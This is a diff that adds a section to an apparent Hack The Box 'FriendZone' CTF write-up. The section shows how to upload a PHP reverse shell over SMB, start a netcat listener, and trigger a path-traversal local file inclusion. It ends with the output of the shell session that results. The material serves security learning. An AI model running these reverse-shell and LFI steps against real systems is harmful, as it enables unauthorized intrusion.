@@ -150,3 +150,36 @@ Time to explore some of those domains. Navigating to <b>https://administrator1.f
 Once logged in we are greeted with a success message and it tells us another directory to visit.
 <center><img src="/htb/friendzone/success.png"></center>
 <br>
+Navigating to <b>/dashboard.php</b> we are greeted with a message that basically tells us that the page is vulnerable.
+
+<center><img src="/htb/friendzone/vuln.png"></center>
+<br>
+If we add the included paramater to the link then we are greeted with yet another message that tells us the parameter is wrong witch hints that we need to use an LFI
+
+<center><img src="/htb/friendzone/parameter.png"></center>
+<br>
+So for the LFI we are going to upload the reverse shell to the <b>Development</b> share since we have Read/Write privileges to it.
+```
+# smbclient -U none //10.10.10.123/Development password
+Try "help" to get a list of possible commands.
+smb: \> put php-reverse-shell.php
+putting file php-reverse-shell.php as \php-reverse-shell.php (30.8 kb/s) (average 30.8 kb/s)
+```
+Now we set up our <b>nc</b> listener on the port we specified in our shell
+```
+# nc -lvnp 10000
+listening on [any] 10000 ...
+```
+Took me some time to find where the Development folder is stored but after some time I found it. To trigger the LFI navigate to <b>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../..//etc/Development/php-reverse-shell</b>. Just make sure you put in the name of your shell and not mine. If you did everything correctly you should get a shell.
+```
+# nc -lvnp 10000
+listening on [any] 10000 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.123] 46614
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 21:39:24 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
